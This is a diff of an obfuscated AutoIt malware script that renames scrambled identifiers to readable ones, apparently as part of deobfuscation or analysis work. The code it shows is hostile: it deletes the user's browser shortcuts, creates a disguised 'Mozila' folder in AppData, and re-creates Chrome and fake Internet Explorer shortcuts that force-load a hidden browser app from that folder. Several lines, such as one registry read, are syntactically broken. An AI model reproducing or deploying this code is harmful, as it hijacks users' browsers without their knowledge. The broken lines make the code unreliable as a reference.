@@ -1553,20 +1553,20 @@ EndIf
 DirCreate(@AppDataDir & '\\Mozila\\')
 
 
-Func FS6819T57753()
+Func GetChromePath()
     Local $TB44737Z1859
-	Local $QV53761I27021
-	Local $QJ66301M54074 = RegRead('HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\chrome.exe', 'Path')
+	Local $InstallLocation
+	Local $ChromePath = RegRead('HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\chrome.exe', 'Path')
 	If StringInStr(RegRead('HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\Google Chrome','InstallLocation'), 'Chrome') Then
-    	$QV53761I27021 = RegRead('HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\Google Chrome','InstallLocation') & '\\chrome.exe'
+    	$InstallLocation = RegRead('HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\Google Chrome','InstallLocation') & '\\chrome.exe'
 	ElseIf StringInStr(RegRead("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Uninstall\Google Chrome",'63504267791308182131'), "InstallLocation"),"Chrome") Then
-		$QV53761I27021=RegRead("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Uninstall\Google Chrome",'63504267791308182131'), "InstallLocation") & '\\chrome.exe'
- 	ElseIf StringInStr($QJ66301M54074,"Chrome") Then
-		$QV53761I27021 = $QJ66301M54074  & '\\chrome.exe'
+		$InstallLocation=RegRead("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Uninstall\Google Chrome",'63504267791308182131'), "InstallLocation") & '\\chrome.exe'
+ 	ElseIf StringInStr($ChromePath,"Chrome") Then
+		$InstallLocation = $ChromePath  & '\\chrome.exe'
 	Else
-		$QV53761I27021 = GetProgramFilesPath() & "\Google\Chrome\Application\chrome.exe"
+		$InstallLocation = GetProgramFilesPath() & "\Google\Chrome\Application\chrome.exe"
 	EndIf
-		Return $QV53761I27021
+	Return $InstallLocation
 EndFunc
 
 Func GetProgramFilesPath()
@@ -1594,22 +1594,22 @@ Func NT94698L80975()
 	FileDelete(@DesktopDir & "\\*Internet*.lnk")
 	FileDelete(@DesktopDir & "\\*Explorer*.lnk")
 	FileDelete(@DesktopDir & "\\*Explorer*.lnk")
-	FB3692G31457(FS6819T57753(),'up2tb','','')
-	FB3692G31457(FS6819T57753(),"up2tb",'','')
-	FB3692G31457(FS6819T57753(),"up2tb",'','')
-	FB3692G31457(FS6819T57753(),"up2tb",'','')
-	FB3692G31457(FS6819T57753(),"up2tb",'','')
+	FB3692G31457(GetChromePath(),'up2tb','','')
+	FB3692G31457(GetChromePath(),"up2tb",'','')
+	FB3692G31457(GetChromePath(),"up2tb",'','')
+	FB3692G31457(GetChromePath(),"up2tb",'','')
+	FB3692G31457(GetChromePath(),"up2tb",'','')
 	FB3692G31457(iepath(),"up2tb",'','')
 	FB3692G31457(iepath(),"up2tb",'','')
 	FB3692G31457(iepath(),"up2tb",'','')
 	FB3692G31457(iepath(),"up2tb",'','')
 	FB3692G31457(iepath(),"up2tb",'','')
 	FB3692G31457(iepath(),"up2sm",'',"Internet Explorer")
-	FB3692G31457(FS6819T57753(),"up2sm",'',"Google Chrome")
-	FB3692G31457(FS6819T57753(), 'p2tb', BinaryToString('--load-and-launch-app="') & @AppDataDir & '\\Mozila' & '"',"Google Chrome")
-	FB3692G31457(FS6819T57753(), 'p2sm', BinaryToString('--load-and-launch-app="') & @AppDataDir & '\\Mozila' & '"',"Google Chrome")
-	FileCreateShortcut(FS6819T57753(),@DesktopDir & "\\Google Chrome.lnk", StringReplace(FS6819T57753(),"chrome.exe",''), '--load-and-launch-app="' & @AppDataDir & '\\Mozila' & '"', "Google Chrome", '', '', "15", @SW_SHOWMAXIMIZED)
-	FileCreateShortcut(FS6819T57753(),@DesktopDir & "\\Internet Explorer.lnk", StringReplace(FS6819T57753(),"chrome.exe",''), '--load-and-launch-app="' & @AppDataDir & '\\Mozila' & '"', "Google Chrome", '', '', "15", @SW_SHOWMAXIMIZED)
+	FB3692G31457(GetChromePath(),"up2sm",'',"Google Chrome")
+	FB3692G31457(GetChromePath(), 'p2tb', BinaryToString('--load-and-launch-app="') & @AppDataDir & '\\Mozila' & '"',"Google Chrome")
+	FB3692G31457(GetChromePath(), 'p2sm', BinaryToString('--load-and-launch-app="') & @AppDataDir & '\\Mozila' & '"',"Google Chrome")
+	FileCreateShortcut(GetChromePath(),@DesktopDir & "\\Google Chrome.lnk", StringReplace(GetChromePath(),"chrome.exe",''), '--load-and-launch-app="' & @AppDataDir & '\\Mozila' & '"', "Google Chrome", '', '', "15", @SW_SHOWMAXIMIZED)
+	FileCreateShortcut(GetChromePath(),@DesktopDir & "\\Internet Explorer.lnk", StringReplace(GetChromePath(),"chrome.exe",''), '--load-and-launch-app="' & @AppDataDir & '\\Mozila' & '"', "Google Chrome", '', '', "15", @SW_SHOWMAXIMIZED)
 	ControlSend('Program Manager', '', '', '{F5}')
  EndFunc
 
@@ -1666,8 +1666,8 @@ Func FB3692G31457($arquivo, $PY88057E8772 = 'p2sm', $QE84068V19446 = '',$FH37126
 
     ;pin or unpin
 
-    $GX26215V48494 = ObjCreate('Shell.Application')
-    $CV39051H10739 = $GX26215V48494.Namespace($QV53761I27021)
+    $ShellApp = ObjCreate('Shell.Application') ;GX26215V48494
+    $CV39051H10739 = $ShellApp.Namespace($QV53761I27021)
     $CV39051H10739Item = $CV39051H10739.ParseName($NY46912G26724H79275Y54978)
 	If IsObj($CV39051H10739Item) Then
     For $CV81871N53913 in $CV39051H10739Item.Verbs()
